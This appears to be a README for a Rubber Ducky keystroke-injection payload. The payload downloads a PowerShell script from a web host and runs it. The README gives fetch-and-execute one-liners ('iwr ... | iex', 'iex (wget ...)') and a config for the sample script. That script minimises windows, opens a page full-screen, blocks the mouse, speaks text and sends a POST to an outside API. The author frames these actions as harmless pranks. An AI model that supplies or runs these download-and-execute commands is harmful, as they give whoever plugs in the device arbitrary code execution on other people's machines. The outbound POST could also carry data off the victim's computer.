## ExeWebScript
> **Note!** Your CMD commands file must be publicly hosted on the web and is by definition not secure.  

This Rubber Ducky Script executes a custom powershell script that is hosted online. Host the `powershellScript.txt` or a custom script online and change the locatin in `ExeWebScript.duck` to that hosted script. 

### Ducky script
It uses IEX to execute plain text from wget. Examples:
```powershell
# shortest
  iwr www.yourSite.com/powershellScript.txt|iex

# alternative
  iex (wget www.yourSite.com/powershellScript.txt)

```
### Powershell script
The powershellScript.txt is just as an example of what some 'harmless' things that you could do.  
It comes with a config for some options.
```powershell
#================================
#            CONFIG 
#================================     

    $MinimizeWindows = $True;
    $ShowPopUp = $False;

    $OpenWebPage = $True;
        $urlNAV = "www.yourWebsite.com/PageToDisplay";
        $OpenInFullScreen = $True;    
        
    $SendPostToAPI = $True;
        $urlAPI = "www.yourWebsite.com/PostAPI";
        
    $BlockMouse = $True;
        $BlockedTimeSeconds = 8;

    $SpeakText = $True;
        $TextToSpeak = "Hi. This is a Rubber Ducky";
